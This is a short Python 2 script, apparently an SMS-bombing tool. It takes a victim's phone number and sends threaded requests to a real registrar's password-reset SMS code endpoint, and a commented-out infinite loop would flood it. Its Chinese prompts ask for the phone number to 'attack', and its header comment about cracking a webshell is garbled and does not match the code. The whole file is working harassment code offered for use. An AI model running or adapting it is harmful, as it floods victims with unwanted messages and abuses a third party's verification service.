#!/usr/bin/python
# -*- coding: utf-8 -*-
#This promgring is use to cark the webshell
import httplib,urllib,sys,os,re,urllib2
import string
import threading
import time

class Attack(threading.Thread):
    def  __init__(self,phone):
        threading.Thread.__init__(self)
    def run(self):
        datas=""
        url="http://www.cndns.com/members/getpass_mbl_chkcode.asp"
        payload={   'usrname':'test',
                    'usrmbl':phone}
        i_headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5",  
                  "Accept": "text/plain"} 
        payload=urllib.urlencode(payload)
        # while(True):
        #     try:
        #         request=urllib2.Request(url,payload,i_headers)
        #         response=urllib2.urlopen(request)
        #         datas=response.read()
        #         print datas
        #     except:
        #         print "attack failed!!!" 
        #         break

        try:
            request=urllib2.Request(url,payload,i_headers)
            response=urllib2.urlopen(request)
            datas=response.read()
            print datas #.decode('utf-8')
        except:
            print "attack failed!!!" 

if __name__=="__main__":
    if len(sys.argv)<2:
        print "请输入您要攻击的手机号^_^"
        sys.exit(1)
    phone=sys.argv[1]
    print '您输入的手机号为：%s'%(phone)
    #print 'start time %s'
    for i in range(2):
        t=Attack(phone)
        t.start()